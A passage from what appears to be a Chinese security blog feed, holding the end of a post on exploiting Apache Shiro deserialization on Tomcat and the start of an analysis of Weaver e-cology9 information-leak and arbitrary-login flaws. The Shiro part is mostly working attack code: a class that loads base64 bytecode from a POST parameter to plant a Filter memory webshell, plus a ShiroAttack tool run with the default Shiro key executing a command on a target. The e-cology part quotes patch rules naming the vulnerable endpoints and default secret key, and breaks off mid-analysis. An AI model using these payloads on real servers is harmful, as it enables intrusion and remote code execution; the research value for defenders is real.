title="Request对象的转换"></a>Request对象的转换</h3><p>基于以上，我们也可以重复利用上面的代码。但不同地是，前文中的request是javax.servlet.http.HttpServletRequest，而这里获取到的是org.apache.coyote.Request，它们二者都是处理HTTP请求的关键类，但所处的层次有所不同。org.apache.coyote.Request主要负责底层的HTTP请求解析和处理，javax.servlet.http.HttpServletRequest则是面向开发者的更高层次的抽象，它能够方便Web应用处理HTTP请求。所以还需要将org.apache.coyote.Request做更高层次的转换，转换为javax.servlet.http.HttpServletRequest。</p><p>javax.servlet.jsp.PageContext提供了对JSP页面执行环境中各种信息的访问，包括请求对象、响应对象、会话对象、应用上下文等。所以，可直接利用该类中的getRequest与getResponse方法来获取HttpServletRequest与HttpServletResponse对象。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getReqResp</span><span class="params">(Object obj)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (obj.getClass().isArray()) &#123;</span><br><span class="line">        Object[] data = (Object[]) ((Object[])((Object[])obj));</span><br><span class="line">        <span class="built_in">this</span>.request = (HttpServletRequest) data[<span class="number">0</span>];</span><br><span class="line">        <span class="built_in">this</span>.response = (HttpServletResponse) data[<span class="number">1</span>];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">pageContext</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.servlet.jsp.PageContext&quot;</span>);</span><br><span class="line">            <span class="built_in">this</span>.request = (HttpServletRequest) pageContext.getDeclaredMethod(<span class="string">&quot;getRequest&quot;</span>).invoke(obj);</span><br><span class="line">            <span class="built_in">this</span>.response = (HttpServletResponse) pageContext.getDeclaredMethod(<span class="string">&quot;getResponse&quot;</span>).invoke(obj);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> HttpServletRequest) &#123;</span><br><span class="line">                <span class="built_in">this</span>.request = (HttpServletRequest) obj;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">Field</span> <span class="variable">reqField</span> <span class="operator">=</span> <span class="built_in">this</span>.request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">                    reqField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    <span class="type">HttpServletRequest</span> <span class="variable">request2</span> <span class="operator">=</span> (HttpServletRequest) reqField.get(<span class="built_in">this</span>.request);</span><br><span class="line">                    <span class="type">Field</span> <span class="variable">respField</span> <span class="operator">=</span> request2.getClass().getDeclaredField(<span class="string">&quot;response&quot;</span>);</span><br><span class="line">                    respField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    <span class="built_in">this</span>.response = (HttpServletResponse) respField.get(request2);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="built_in">this</span>.response = (HttpServletResponse) <span class="built_in">this</span>.request.getClass().getDeclaredMethod(<span class="string">&quot;getResponse&quot;</span>).invoke(obj);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Exception exc) &#123;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="defineClass"><a href="#defineClass" class="headerlink" title="defineClass"></a>defineClass</h3><p>现在有了Request和StandardContext，终于可以构造Filter内存马了，但会发现生成的Payload长度非常大，已经超过Tomcat默认8K的maxHttpHeaderSize，超出这个大小后Tomcat便会返回400状态码。</p><p><img src="/img/post/attacking-shiro-with-tomcat-memshell/3.png"></p><p>运用先前学到的Java类加载知识，将添加Filter的恶意类作为POST参数值进行传递。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.shiroattack;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> sun.misc.BASE64Decoder;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DefineClass</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Object <span class="title function_">getFieldValue</span><span class="params">(Object obj, String field)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        java.lang.reflect.<span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> obj.getClass();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (cls != Object.class) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                f = cls.getDeclaredField(field);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">                cls = cls.getSuperclass();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (f == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchFieldException</span>(field);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">return</span> f.get(obj);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">DefineClass</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        Thread[] threads = (Thread[]) getFieldValue(Thread.currentThread().getThreadGroup(), <span class="string">&quot;threads&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; threads.length; ++i) &#123;</span><br><span class="line">            <span class="type">Thread</span> <span class="variable">thread</span> <span class="operator">=</span> threads[i];</span><br><span class="line">            <span class="keyword">if</span> (thread != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">threadName</span> <span class="operator">=</span> thread.getName();</span><br><span class="line">                <span class="keyword">if</span> (!threadName.contains(<span class="string">&quot;exec&quot;</span>) &amp;&amp; threadName.contains(<span class="string">&quot;http&quot;</span>)) &#123;</span><br><span class="line">                    <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> getFieldValue(thread, <span class="string">&quot;target&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> Runnable) &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            obj = getFieldValue(getFieldValue(getFieldValue(obj, <span class="string">&quot;this$0&quot;</span>), <span class="string">&quot;handler&quot;</span>), <span class="string">&quot;global&quot;</span>);</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                            <span class="keyword">continue</span>;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        java.util.<span class="type">List</span> <span class="variable">processors</span> <span class="operator">=</span> (java.util.List) getFieldValue(obj,<span class="string">&quot;processors&quot;</span>);</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> <span class="number">0</span>; n &lt; processors.size(); ++n) &#123;</span><br><span class="line">                            <span class="type">Object</span> <span class="variable">processor</span> <span class="operator">=</span> processors.get(n);</span><br><span class="line">                            obj = getFieldValue(processor, <span class="string">&quot;req&quot;</span>);</span><br><span class="line"></span><br><span class="line">                            <span class="type">Object</span> <span class="variable">conreq</span> <span class="operator">=</span> obj.getClass().getMethod(<span class="string">&quot;getNote&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;<span class="type">int</span>.class&#125;).invoke(obj, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="keyword">new</span> <span class="title class_">Integer</span>(<span class="number">1</span>)&#125;);</span><br><span class="line"></span><br><span class="line">                            <span class="type">String</span> <span class="variable">c</span> <span class="operator">=</span> (String) conreq.getClass().getMethod(<span class="string">&quot;getParameter&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;).invoke(conreq, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;class&quot;</span>)&#125;);</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">if</span> (c != <span class="literal">null</span> &amp;&amp; !c.isEmpty()) &#123;</span><br><span class="line">                                <span class="type">byte</span>[] bytecodes = <span class="keyword">new</span> <span class="title class_">sun</span>.misc.BASE64Decoder().decodeBuffer(c);</span><br><span class="line">        </span><br><span class="line">                                java.lang.reflect.<span class="type">Method</span> <span class="variable">defineClassMethod</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;<span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class&#125;);</span><br><span class="line">                                defineClassMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        </span><br><span class="line">                                <span class="type">Class</span> <span class="variable">cc</span> <span class="operator">=</span> (Class) defineClassMethod.invoke(<span class="built_in">this</span>.getClass().getClassLoader(), <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;bytecodes, <span class="keyword">new</span> <span class="title class_">Integer</span>(<span class="number">0</span>), <span class="keyword">new</span> <span class="title class_">Integer</span>(bytecodes.length)&#125;);</span><br><span class="line">        </span><br><span class="line">                                cc.newInstance().equals(conreq);</span><br><span class="line">                                flag = <span class="literal">true</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">if</span> (flag) &#123;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span> (flag) &#123;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="工具自动化利用"><a href="#工具自动化利用" class="headerlink" title="工具自动化利用"></a>工具自动化利用</h2><p>最终，根据以上所有，编写一个自动化利用的工具ShiroAttack。</p><ul><li><a href="https://github.com/0xf4n9x/ShiroAttack">https://github.com/0xf4n9x/ShiroAttack</a></li></ul><h3 id="TomcatEcho"><a href="#TomcatEcho" class="headerlink" title="TomcatEcho"></a>TomcatEcho</h3><p>Tomcat通用回显，已在Tomcat 7.0.0、7.0.10、7.0.109、8.5.54、9.0.10版本上测试攻击成功，但6.0.53和10.0.0版本上攻击失败。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$ java -jar ShiroAttack.jar -p http://127.0.0.1:8080 -u http://192.168.1.100:8089 -k kPH+bIxk5D2deZiIxcaaaA== -m CBC -a TomcatEcho -c <span class="built_in">pwd</span></span><br><span class="line"></span><br><span class="line">   _____ __    _            ___   __  __             __</span><br><span class="line">  / ___// /_  (_)________  /   | / /_/ /_____ ______/ /__</span><br><span class="line">  \__ \/ __ \/ / ___/ __ \/ /| |/ __/ __/ __ `/ ___/ //_/</span><br><span class="line"> ___/ / / / / / /  / /_/ / ___ / /_/ /_/ /_/ / /__/ ,&lt;</span><br><span class="line">/____/_/ /_/_/_/   \____/_/  |_\__/\__/\__,_/\___/_/|_|</span><br><span class="line"></span><br><span class="line">[*] URL: http://192.168.1.100:8089</span><br><span class="line">[*] Proxy: http://127.0.0.1:8080</span><br><span class="line">[*] Shiro Key: kPH+bIxk5D2deZiIxcaaaA==</span><br><span class="line">[*] Encryption mode: AES-CBC</span><br><span class="line">[*] Type of attack: TomcatEcho</span><br><span class="line">[*] Timeout: 20s</span><br><span class="line">[*] Command: <span class="built_in">pwd</span></span><br><span class="line"></span><br><span class="line">/opt/apache-tomcat/apache-tomcat-7.0.0/bin</span><br></pre></td></tr></table></figure><h3 id="FilterMemShell"><a href="#FilterMemShell" class="headerlink" title="FilterMemShell"></a>FilterMemShell</h3><p>Filter型内存马注入，已在Tomcat 7.0.10、7.0.109、8.5.54、9.0.10、9.0.70版本上测试攻击成功，但6.0.53、7.0.0和10.0.0版本上攻击失败。</p><p><img src="/img/post/attacking-shiro-with-tomcat-memshell/4.png"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://0xf4n9x.github.io/tomcat-filter-memshell.html">https://0xf4n9x.github.io/tomcat-filter-memshell.html</a></p><p><a href="https://0xf4n9x.github.io/java-classloader.html">https://0xf4n9x.github.io/java-classloader.html</a></p><p><a href="https://mp.weixin.qq.com/s/O9Qy0xMen8ufc3ecC33z6A">https://mp.weixin.qq.com/s/O9Qy0xMen8ufc3ecC33z6A</a></p><p><a href="https://xz.aliyun.com/t/7348">https://xz.aliyun.com/t/7348</a></p><p><a href="https://github.com/KpLi0rn/shiro_attack">https://github.com/KpLi0rn/shiro_attack</a></p><p><a href="https://github.com/0xf4n9x/ShiroAttack">https://github.com/0xf4n9x/ShiroAttack</a></p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> rce </tag>
            
            <tag> shiro </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>泛微e-cology9 changeUserInfo信息泄漏及ofsLogin任意用户登录漏洞分析</title>
      <link href="/weaver-ecology9-changeuserinfo-ofslogin.html"/>
      <url>/weaver-ecology9-changeuserinfo-ofslogin.html</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#0x00-%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B">0x00 漏洞简介</a></li><li><a href="#0x01-%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4">0x01 影响范围</a><ul><li><a href="#e-cology9%E6%9C%AC%E8%BA%AB%E7%89%88%E6%9C%AC">e-cology9本身版本</a></li><li><a href="#%E8%A1%A5%E4%B8%81%E7%89%88%E6%9C%AC">补丁版本</a></li></ul></li><li><a href="#0x02-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">0x02 漏洞分析</a><ul><li><a href="#%E8%A1%A5%E4%B8%81%E5%8C%85%E5%88%86%E6%9E%90">补丁包分析</a></li><li><a href="#%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E5%88%86%E6%9E%90">任意用户登录分析</a></li><li><a href="#%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E5%88%86%E6%9E%90">信息泄漏分析</a></li></ul></li><li><a href="#0x03-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">0x03 漏洞利用</a></li><li><a href="#0x04-%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE">0x04 修复建议</a></li></ul><h2 id="0x00-漏洞简介"><a href="#0x00-漏洞简介" class="headerlink" title="0x00 漏洞简介"></a>0x00 漏洞简介</h2><p>泛微协同管理应用平台(e-cology)是一套兼具企业信息门户、知识文档管理、工作流程管理、人力资源管理、客户关系管理、项目管理、财务管理、资产管理、供应链管理、数据中心功能的企业大型协同管理平台，并可形成一系列的通用解决方案和行业解决方案。</p><p>2023年05月15日，泛微官方发布10.57.2版本安全补丁。其中修复了两个漏洞，分别是信息泄漏和任意用户登录漏洞，两个漏洞可以被攻击者组合起来利用，从而能够使攻击者进入到系统后台。</p><h2 id="0x01-影响范围"><a href="#0x01-影响范围" class="headerlink" title="0x01 影响范围"></a>0x01 影响范围</h2><h3 id="e-cology9本身版本"><a href="#e-cology9本身版本" class="headerlink" title="e-cology9本身版本"></a>e-cology9本身版本</h3><p>在测试的几个版本中，如下几个版本是不存在<code>ofsLogin.jsp</code>文件的。</p><ul><li>9.00.1807.03</li><li>9.00.2008.17</li><li>9.00.2102.07</li><li>9.00.2110.01</li></ul><p>在如下版本中是存在<code>ofsLogin.jsp</code>文件的。</p><ul><li>9.00.2206.02</li></ul><p>那么可以简单判断，在<code>9.00.2110.01</code>以及之前的版本是不受该漏洞的影响的，在<code>9.00.2206.02</code><strong>以及之后的版本</strong>可能会受到该漏洞的影响，而在这两个版本之间的版本，由于没有源码，是否受影响就不得而知了。</p><h3 id="补丁版本"><a href="#补丁版本" class="headerlink" title="补丁版本"></a>补丁版本</h3><ul><li>&lt;10.57.2</li></ul><h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><h3 id="补丁包分析"><a href="#补丁包分析" class="headerlink" title="补丁包分析"></a>补丁包分析</h3><p>2023年04月18日，泛微首次发布v10.57版本补丁包，同年05月15日又发布v10.57.2版本补丁包，通过如下两条链接分别下载两个版本的补丁包。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.weaver.com.cn/cs/package/Ecology_security_20230418_v9.0_v10.57.zip?v=20230418</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.weaver.com.cn/cs/package/Ecology_security_20230515_v9.0_v10.57.2.zip?v=20230515</span><br></pre></td></tr></table></figure><p>由于泛微官方已经将本文两个漏洞的补丁文件覆盖到了v10.57版本补丁包中，所以现在下载到的v10.57版本补丁包其中也有了相关的漏洞补丁文件。拿现在构造好的链接下载得到的v10.57版本补丁包与v10.57.2版本补丁包相对比是对比不出什么差异的。</p><p>不过我在04月20日及时下载了v10.57版本的补丁包，所以拿其与现在的v10.57.2版本补丁包对比，是能够很迅速地发现新增的漏洞补丁文件。</p><p><img src="/img/post/weaver-ecology9-changeuserinfo-ofslogin/image-20230519162317147.png"></p><p><img src="/img/post/weaver-ecology9-changeuserinfo-ofslogin/image-20230519162750163.png"></p><p>如下是第一个漏洞补丁代码，暴露出的是<code>/mobile/plugin/1/ofsLogin.jsp</code>文件与<code>syscode</code>参数，并且还检查<code>transferE9</code>文件中<code>secretkey</code>的值是否等于<code>u6skkR</code>，如果是则提醒更改密钥，且产生漏洞利用安全警告。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (path.indexOf(<span class="string">&quot;/mobile/&quot;</span>) != -<span class="number">1</span> &amp;&amp; path.contains(<span class="string">&quot;/plugin/&quot;</span>) &amp;&amp; path.contains(<span class="string">&quot;/1/&quot;</span>) &amp;&amp; path.indexOf(<span class="string">&quot;ofslogin.jsp&quot;</span>) != -<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> sc.getUser(req);</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    <span class="type">String</span> <span class="variable">returnInfoString</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="type">BaseBean</span> <span class="variable">baseBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BaseBean</span>();</span><br><span class="line">    <span class="type">int</span> <span class="variable">isFix</span> <span class="operator">=</span> sc.getIntValue(baseBean.getPropValue(<span class="string">&quot;transferE9&quot;</span>, <span class="string">&quot;isFix&quot;</span>));</span><br><span class="line">    <span class="keyword">if</span> (isFix == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">rnd</span> <span class="operator">=</span> baseBean.getPropValue(<span class="string">&quot;transferE9&quot;</span>, <span class="string">&quot;secretkey&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;u6skkR&quot;</span>.equalsIgnoreCase(rnd) || StringUtils.isBlank(rnd) || rnd.length() &lt; <span class="number">8</span>) &#123;</span><br><span class="line">        returnInfoString = <span class="string">&quot;认证密钥不安全，transferE9中更新密钥，请更改密钥，建议设置为：&quot;</span> + UUID.randomUUID().toString().substring(<span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">        sc.putToTmpForbiddenIpMap(ThreadVarManager.getIp(), req.getRequestURI(), <span class="string">&quot;漏洞利用&quot;</span>);</span><br><span class="line">        sc.writeLog(<span class="string">&quot;&gt;&gt;&gt;&gt;Xss(Validate failed[access reject]) validateClass=weaver.security.rules.SecurityRuleOfcLogin  path=&quot;</span> + req.getRequestURI() + <span class="string">&quot; msg:&quot;</span> + returnInfoString + <span class="string">&quot; security validate failed! pushKey is null!  user:&quot;</span> + (user != <span class="literal">null</span> ? user.getLastname() : <span class="literal">null</span>) + <span class="string">&quot;  source ip:&quot;</span> + ThreadVarManager.getIp());</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">syscode</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;syscode&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;im&quot;</span>.equalsIgnoreCase(syscode)) &#123;</span><br><span class="line">        returnInfoString = <span class="string">&quot;syscode参数异常，syscode=&quot;</span> + syscode;</span><br><span class="line">        sc.putToTmpForbiddenIpMap(ThreadVarManager.getIp(), req.getRequestURI(), <span class="string">&quot;漏洞利用&quot;</span>);</span><br><span class="line">        sc.writeLog(<span class="string">&quot;&gt;&gt;&gt;&gt;Xss(Validate failed[access reject]) validateClass=weaver.security.rules.SecurityRuleOfcLogin  path=&quot;</span> + req.getRequestURI() + <span class="string">&quot; msg:&quot;</span> + returnInfoString + <span class="string">&quot; security validate failed! pushKey is null!  user:&quot;</span> + (user != <span class="literal">null</span> ? user.getLastname() : <span class="literal">null</span>) + <span class="string">&quot;  source ip:&quot;</span> + ThreadVarManager.getIp());</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第二个漏洞的补丁代码如下，指明<code>/mobile/plugin/changeUserInfo.jsp</code>文件与当<code>type</code>参数值等于<code>&quot;getLoginid&quot;</code>时的情况。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (path.contains(<span class="string">&quot;/mobile/&quot;</span>) &amp;&amp; path.contains(<span class="string">&quot;/plugin/&quot;</span>) &amp;&amp; path.contains(<span class="string">&quot;/changeuserinfo.jsp&quot;</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;E9&quot;</span>.equals(sc.getEcVersion())) &#123;</span><br><span class="line">        sc.putToTmpForbiddenIpMap(ThreadVarManager.getIp(), req.getRequestURI(), <span class="string">&quot;漏洞利用&quot;</span>);</span><br><span class="line">        sc.writeLog(<span class="string">&quot;&gt;&gt;&gt;&gt;Xss(Validate failed[acess reject]) validateClass=weaver.security.rules.SecurityRuelForMobileChangeInfo  path=&quot;</span> + req.getRequestURL() + <span class="string">&quot;  security validate failed! user: &quot;</span> + (user != <span class="literal">null</span> ? user.getLastname() : <span class="string">&quot;&quot;</span>) + <span class="string">&quot; source ip:&quot;</span> + ThreadVarManager.getIp());</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">type</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;type&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;getLoginid&quot;</span>.equals(type)) &#123;</span><br><span class="line">        sc.putToTmpForbiddenIpMap(ThreadVarManager.getIp(), req.getRequestURI(), <span class="string">&quot;漏洞利用&quot;</span>);</span><br><span class="line">        sc.writeLog(<span class="string">&quot;&gt;&gt;&gt;&gt;Xss(Validate failed[acess reject]) validateClass=weaver.security.rules.SecurityRuelForMobileChangeInfo  path=&quot;</span> + req.getRequestURL() + <span class="string">&quot; type=&quot;</span> + type + <span class="string">&quot; security validate failed! user: &quot;</span> + (user != <span class="literal">null</span> ? user.getLastname() : <span class="string">&quot;&quot;</span>) + <span class="string">&quot; source ip:&quot;</span> + ThreadVarManager.getIp());</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么，接下来对如上两个文件做进一步分析。</p><h3 id="任意用户登录分析"><a href="#任意用户登录分析" class="headerlink" title="任意用户登录分析"></a>任意用户登录分析</h3><p>首先先进入<code>mobile/plugin/1/ofsLogin.jsp</code>文件，如下图所示。</p><p><img 